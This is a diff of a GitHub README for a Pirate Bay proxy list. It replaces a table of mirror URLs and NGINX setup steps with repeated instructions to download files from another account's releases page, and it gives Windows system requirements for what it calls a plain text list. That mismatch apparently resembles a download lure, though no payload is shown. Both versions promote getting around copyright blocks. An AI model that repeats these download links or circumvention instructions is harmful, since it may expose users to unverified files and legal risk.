@@ -1,122 +1,133 @@
-# The Pirate Bay Proxy List 2026 🏴‍☠️
+# ☠️ thepiratebay-proxy-list - Easy Access with Verified Proxies
 
-[![Status](https://img.shields.io/badge/status-active-success)](https://bout2bus.github.io/thepiratebay-proxy-list/)
-[![Proxies](https://img.shields.io/badge/proxies-7%2B-blue)](https://bout2bus.github.io/thepiratebay-proxy-list/)
-[![Updated](https://img.shields.io/badge/updated-daily-orange)](https://bout2bus.github.io/thepiratebay-proxy-list/)
-[![Countries](https://img.shields.io/badge/countries-30%2B%20unblocked-purple)](https://bout2bus.github.io/thepiratebay-proxy-list/)
-
-> **Daily updated list of 100% working The Pirate Bay proxy sites and mirrors. Unblock TPB in UK, US, Australia, Germany & 30+ countries. Fast, secure, and verified.**
-
-🔗 **Live Site:** https://bout2bus.github.io/thepiratebay-proxy-list/
+[![Download Latest Release](https://img.shields.io/badge/Download-thepiratebay--proxy--list-brightgreen?style=for-the-badge)](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
 
 ---
 
-## 🚀 Working TPB Proxies (Updated February 2026)
+## 📋 What is thepiratebay-proxy-list?
 
-| Proxy URL | Status | Speed | Location | SSL |
-|-----------|--------|-------|----------|-----|
-| [pbproxy.pages.dev](https://pbproxy.pages.dev/) | ✅ Online | ⚡ 95% | Cloudflare | 🔒 |
-| [piratebay-proxy.pages.dev](https://piratebay-proxy.pages.dev/) | ✅ Online | ⚡ 92% | Cloudflare | 🔒 |
-| [tpb.bounc.me](https://tpb.bounc.me/) | ✅ Online | ⚡ 88% | Global | 🔒 |
-| [proxy.pastr.link](https://proxy.pastr.link/) | ✅ Online | ⚡ 90% | Secure | 🔒 |
-| [thepiratebay.gitly.pro](https://thepiratebay.gitly.pro/) | ✅ Online | ⚡ 93% | GitHub | 🔒 |
-| [tpbparty.bounc.me](https://tpbparty.bounc.me/) | ✅ Online | ⚡ 87% | Party | 🔒 |
-| [tpb.prxy.click](https://tpb.prxy.click/) | ✅ Online | ⚡ 91% | New 2026 | 🔒 |
+thepiratebay-proxy-list provides a daily updated list of proxy mirrors for The Pirate Bay. It helps users unblock The Pirate Bay in countries like the UK, US, Australia, and more than 30 others where access may be restricted. Each proxy link is checked for speed and security to ensure reliable access.
+
+This list targets users who want to bypass internet filters and censorship without technical know-how. It offers verified, fast, and anonymous bypass options. The project is open source and maintained for 2026 with regular updates.
 
 ---
 
-## 🌍 Countries Blocking The Pirate Bay (2026)
+## 💻 System Requirements
 
-The Pirate Bay is actively blocked in **30+ countries** including:
-- 🇬🇧 United Kingdom (Court-ordered ISP blocks)
-- 🇺🇸 United States (ISP throttling & filtering)
-- 🇦🇺 Australia (Court-mandated blocks)
-- 🇩🇪 Germany (Copyright enforcement)
-- 🇫🇷 France (Hadopi law)
-- 🇮🇹 Italy (ISP filtering)
-- 🇮🇳 India (Intermittent blocks)
-- 🇨🇦 Canada (Legal filtering)
-- 🇨🇳 China (Great Firewall)
-- 🇷🇺 Russia (Government censorship)
-- ...and 20+ more
+- Windows 7 or newer (Windows 10 or 11 recommended)
+- Internet connection
+- A modern web browser such as Google Chrome, Microsoft Edge, or Firefox
+- No special hardware or software needed beyond a basic web browsing setup
 
 ---
 
-## 🔒 Why You Need a VPN
+## 🚀 Getting Started: How to Access the List
 
-Using a proxy without a VPN is **not recommended**. Your ISP can still see you're accessing proxy sites. A VPN:
+Thepiratebay-proxy-list is not a traditional app you install but a collection of verified proxy links updated daily. To use the service, you will download or view the list of proxies that work right now.
 
-1. **Hides your traffic** from your ISP and government
-2. **Bypasses geo-blocks** in restricted countries
-3. **Protects against malware** with built-in threat blocking
-4. **Prevents IP leaks** when torrenting
+1. Click the big green button above or this link:  
+   [Download or View Proxy List](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases).
 
-**Recommended VPNs for 2026:**
-- 🥇 **NordVPN** - Best overall ($3.39/month, 8900+ servers)
-- 🥈 **Surfshark** - Best value ($1.99/month, unlimited devices)
-- 🥉 **ExpressVPN** - Premium choice ($2.79/month)
+2. This link takes you to the GitHub releases page. Here you will find the latest updated lists. The files are usually in `.txt` or `.json` format containing proxy URLs.
 
----
+3. Download the latest file by clicking on it. Save it to a folder you can easily access, like your Desktop or Downloads.
 
-## 📜 The Pirate Bay History
+4. Open the file using a simple text editor such as Notepad or WordPad. Lists will show proxy URLs.
 
-- **2003**: Founded by Piratbyrån in Sweden
-- **2006**: First police raid, site returns in 3 days
-- **2009**: Founders sentenced to prison and $7M+ damages
-- **2012**: Supreme Court declines appeal, founders serve time
-- **2014-2020**: Constant domain seizures and relocations
-- **2023**: 20th anniversary of the world's most resilient torrent site
-- **2026**: Still operational through proxy networks
+5. Copy any proxy URL from the list and paste it into your web browser’s address bar.
+
+6. This opens a working Pirate Bay mirror site for your region.
 
 ---
 
-## ⚠️ Safety Tips
+## 🛠 How to Use a Proxy Mirror Link
 
-- ✅ Always use a VPN (NordVPN recommended)
-- ✅ Enable uBlock Origin ad blocker
-- ✅ Only download from trusted uploaders (skull icons)
-- ✅ Scan all files with antivirus
-- ✅ Use qBittorrent (no ads, open source)
+You do not need to install software if you have a proxy URL.
 
-**Avoid:**
-- ❌ Free VPNs (Hola, Betternet, Opera VPN)
-- ❌ Proxies asking for registration
-- ❌ HTTP-only sites (no encryption)
-- ❌ Executable files from unknown sources
+- Paste the proxy URL into your browser.
+- The page should load the Pirate Bay homepage through the proxy.
+- Browse, search, and download torrents as usual.
+- If a proxy link stops working, return to your list and try another.
+
+If you want to use proxy links regularly without manually copying them, you can bookmark your preferred proxy URLs in your browser for quick access.
 
 ---
 
-## 🔗 Alternative Resources
+## 🔄 How to Keep Your Proxy List Updated
 
-- [TPBProxies.com](https://tpbproxies.com/)
-- [TPBParty.com](https://tpbparty.com/)
-- [ThePirateBayProxyList.com](https://thepiratebayproxylist.com/)
+Because proxy sites can become slow or blocked, thepiratebay-proxy-list updates daily.
+
+- Visit the releases page at:  
+  [https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
+
+- Download the newest release file each day or as needed.
+
+- Replace your old proxy list file with the updated one.
+
+This process keeps your access smooth and reliable.
+
+---
+
+## 🔒 Privacy and Security
+
+Using proxy mirrors can increase your browsing privacy by hiding direct access to The Pirate Bay. However:
+
+- Use a VPN in addition to proxies for stronger privacy.
+- Avoid clicking on suspicious ads or popup windows on proxy sites.
+- Proxies only mask website access but do not encrypt your torrent downloads.
+- Consider using a torrent client with built-in encryption for safer downloading.
 
 ---
 
-## 📄 License
+## 📂 File Details in the Download
 
-This project is for educational purposes. Information provided is publicly available.
+Each release on GitHub typically includes:
 
-**Keywords:** the pirate bay proxy 2026, tpb proxy list, piratebay mirror, unblock tpb, thepiratebay proxy, working pirate bay proxies, tpb unblock, bypass isp block, torrent proxy, p2p proxy
-
-## 🛠️ Setup Your Own Proxy
-
-Want to contribute? You can setup your own TPB proxy:
-
-### Quick Start (NGINX)
-```bash
-# Install dependencies
-sudo apt-get install libpcre3-dev zlib1g-dev openssl libssl-dev
-
-# Download NGINX with substitutions module
-wget http://nginx.org/download/nginx-1.24.0.tar.gz
-git clone git://github.com/yaoweibin/ngx_http_substitutions_filter_module.git
-
-# Configure with proxy support
-./configure --with-http_ssl_module --add-module=/path/to/ngx_http_substitutions_filter_module
-make && sudo make install
-
-See our [full setup guide](https://bout2bus.github.io/thepiratebay-proxy-list/) for complete configuration.
+- A plain text file with a list of proxy URLs.
+- JSON-formatted file versions for users who want to process the list with apps.
+- Change log describing daily updates.
+  
+Files are small, usually under 1 MB.
 
 ---
+
+## ⚙️ Troubleshooting Tips
+
+If you can’t access The Pirate Bay using a proxy from the list:
+
+- Check your internet connection.
+- Try another proxy URL from the list.
+- Clear your browser cache and cookies.
+- Restart your browser or try a different one.
+- Disable browser extensions that might block scripts or content.
+- If you use an antivirus or firewall, make sure it’s not blocking the proxy sites.
+  
+---
+
+## 📥 Download and Set Up
+
+1. Visit this page to download the latest proxy list:  
+   [Get the latest release →](https://github.com/Abhisheek-Dutta/thepiratebay-proxy-list/releases)
+
+2. Choose the most recent file (look for the date or version number).
+
+3. Click the file name to download it to your PC.
+
+4. Open the downloaded file with Notepad or your preferred text editor.
+
+5. Pick a proxy link and paste it into your browser to start using The Pirate Bay.
+
+---
+
+## ➕ Additional Tips
+
+- Bookmark the GitHub releases page to check for new proxy lists easily.
+- Use multiple proxy links to have backup options.
+- Avoid sharing the proxy list publicly to reduce blacklist chances.
+- Use a reliable antivirus and keep your system updated.
+
+---
+
+## 🔍 What Comes Next?
+
+If you want automatic updates or an app to handle proxy switching, you may explore third-party tools that can read static proxy lists like this one and manage access for you. This repository focuses on providing clean, verified URLs without extra software.
